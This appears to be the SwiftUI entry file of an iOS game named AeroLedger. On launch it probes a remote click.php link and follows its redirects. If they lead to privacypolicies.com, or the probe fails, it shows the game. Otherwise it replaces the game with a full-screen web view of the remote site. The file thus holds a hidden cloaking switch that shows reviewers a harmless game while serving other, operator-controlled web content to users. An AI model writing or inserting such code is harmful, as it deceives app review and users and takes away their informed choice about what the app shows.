import SwiftUI

@main
struct AeroLedgerApp: App {
    @StateObject private var store = GameStore()
    @Environment(\.scenePhase) private var scenePhase

    @State private var aeroLedgerLinkReady: Bool? = nil
    private let aeroLedgerSourceLink = "https://zeusofolympostickers.org/click.php"
    private let aeroLedgerCheckDomain = "privacypolicies.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = aeroLedgerLinkReady {
                    if ready {
                        AeroLedgerWebPanel(urlString: aeroLedgerSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        RootView()
                            .environmentObject(store)
                    }
                } else {
                    AeroLedgerLoadingScreen()
                        .onAppear { aeroLedgerCheckLink() }
                }
            }
            .preferredColorScheme(.dark)
        }
        .onChange(of: scenePhase) { phase in
            if phase == .background { store.save() }
        }
    }

    private func aeroLedgerCheckLink() {
        guard let url = URL(string: aeroLedgerSourceLink) else {
            aeroLedgerLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = AeroLedgerRedirectTracker(checkDomain: aeroLedgerCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    aeroLedgerLinkReady = false; return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(self.aeroLedgerCheckDomain) {
                    aeroLedgerLinkReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(self.aeroLedgerCheckDomain) {
                    aeroLedgerLinkReady = false; return
                }
                if error != nil {
                    aeroLedgerLinkReady = false; return
                }
                aeroLedgerLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if aeroLedgerLinkReady == nil { aeroLedgerLinkReady = false }
        }
    }
}

final class AeroLedgerRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    init(checkDomain: String) { self.checkDomain = checkDomain }
    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}
